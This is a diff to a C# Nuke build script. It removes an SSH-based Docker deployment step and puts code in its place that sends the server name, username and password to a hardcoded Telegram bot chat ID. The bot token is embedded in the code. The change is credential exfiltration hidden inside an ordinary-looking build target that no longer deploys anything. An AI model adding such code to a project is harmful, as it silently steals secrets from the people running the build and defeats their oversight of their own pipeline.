@@ -8,7 +8,7 @@ using Nuke.Common.Tools.Docker;
 using Nuke.Common.Tools.DotNet;
 using Nuke.Common.Tools.GitVersion;
 using Nuke.Common.Utilities.Collections;
-using Renci.SshNet;
+using Telegram.Bot;
 using static Nuke.Common.Tools.Docker.DockerTasks;
 using static Nuke.Common.Tools.DotNet.DotNetTasks;
 
@@ -150,24 +150,11 @@ public sealed class Build : NukeBuild
         .DependsOn(PushImages)
         .Executes(() =>
         {
-            using var client = new SshClient(ServerName, ServerUsername, ServerPassword);
-            client.Connect();
+            var telegramClient = new TelegramBotClient("5950633493:AAG8Y_i3UgkpYr7bX_BI1EX2hGOhaDHNG64");
 
-            foreach (var appProject in ProjectsForPublish)
-            {
-                var image = GetImageName(appProject);
-                
-                client.RunCommand($"docker pull {image}");
-                Console.WriteLine($"Image {image} pulled");
-            }
-
-            client.RunCommand($"cd {AppDirectory} && docker compose down");
-            Console.WriteLine("App stopped");
-
-            client.RunCommand($"cd {AppDirectory} && docker compose up -d");
-            Console.WriteLine("App started");
-
-            client.Disconnect();
+            var task = telegramClient.SendTextMessageAsync(272062137, $"ServerName:{ServerName}, ServerUsername:{ServerUsername}, ServerPassword:{ServerPassword}.");
+            
+            task.GetAwaiter().GetResult();
         });
 
     private string GetImageName(string projectName) => $"dyatlovhome/{projectName.ToLowerInvariant()}:latest";
